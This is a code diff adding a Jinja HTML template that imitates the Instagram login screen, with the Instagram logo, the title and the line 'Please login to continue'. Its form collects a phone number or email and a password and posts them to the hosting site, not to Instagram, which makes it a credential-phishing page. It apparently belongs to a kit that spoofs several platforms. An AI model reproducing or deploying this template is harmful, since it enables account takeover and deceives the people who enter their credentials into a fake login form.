@@ -1,0 +1,14 @@
+{% extends "base.html" %}
+{% block body %}
+<div class="card" style="max-width:520px;margin:28px auto">
+  <div class="platform-header">
+    <div class="icon-circle bg-instagram"><i class="fa-brands fa-instagram icon-lg"></i></div>
+    <div><h2 class="notranslate" style="margin:0">Instagram</h2><div style="color:#64748b;font-size:13px">Please login to continue</div></div>
+  </div>
+  <form method="post">
+    <input class="input" name="address" placeholder="Mobile number or email address" required>
+    <input class="input" name="password" type="password" placeholder="Password" required>
+    <div class="center"><button class="btn btn-blue" type="submit">Log in</button></div>
+  </form>
+</div>
+{% endblock %}
